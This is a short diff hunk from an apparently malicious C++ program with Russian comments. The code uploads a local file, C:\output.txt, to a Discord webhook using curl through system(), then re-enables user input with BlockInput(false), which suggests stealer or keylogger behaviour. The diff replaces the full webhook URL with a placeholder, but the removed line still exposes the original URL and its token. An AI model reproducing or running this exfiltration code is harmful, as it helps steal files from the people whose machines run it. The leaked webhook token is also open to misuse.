@@ -157,7 +157,7 @@ int main() {
     std::this_thread::sleep_for(std::chrono::milliseconds(500));
 
     // Отправка файла через curl
-    system("curl -X POST https://discord.com/api/webhooks/1308891725338640425/5pnnK2W7xVoqEEdRoUws8M57s0bhNAOH5q8yVIJHz8i3Ubg1LMdq6DJpzAVT-G4umb4b -F \"file=@C:\\output.txt\"");
+    system("curl -X POST discordwebhookthere -F \"file=@C:\\output.txt\"");
 
     // Разблокировка ввода
     BlockInput(false);
